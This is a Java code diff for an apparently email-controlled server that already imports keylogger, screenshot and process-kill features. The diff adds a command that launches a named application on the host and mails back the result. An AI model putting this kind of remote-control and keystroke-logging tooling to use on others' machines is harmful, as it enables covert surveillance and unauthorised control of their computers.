@@ -5,6 +5,7 @@ import com.example.server.features.keylogger.KeyLog;
 import com.example.server.features.list.KillPrc;
 import com.example.server.features.list.ListApp;
 import com.example.server.features.list.ListPrc;
+import com.example.server.features.list.RunApp;
 import com.example.server.features.power.SRS;
 import com.example.server.features.screenshot.Screenshot;
 import com.example.server.mail.sendMail;
@@ -230,6 +231,26 @@ public class sendResponse extends Thread{
                         sm.sendContent("Kill Unsuccessful");
                         Server.nameReqList.add("Kill Process");
                         Server.resList.add("Unsuccessfull");
+                    }
+                    break;
+                }
+                case "12":{
+                    RunApp ra = new RunApp();
+                    String appName = Server.reqList.get(index).split(" ",-1)[1].strip();
+                    try {
+                        ra.run(appName);
+                    } catch (IOException e) {
+                        throw new RuntimeException(e);
+                    }
+                    Server.nameReqList.add("Run app " + appName);
+                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
+                    if (ra.isSuccess()){
+                        sm.sendContent("Run "+ appName + " successfully");
+                        Server.resList.add("Successful");
+                    }
+                    else {
+                        sm.sendContent(appName+" is not exist");
+                        Server.resList.add("Unsuccessful");
                     }
                     break;
                 }
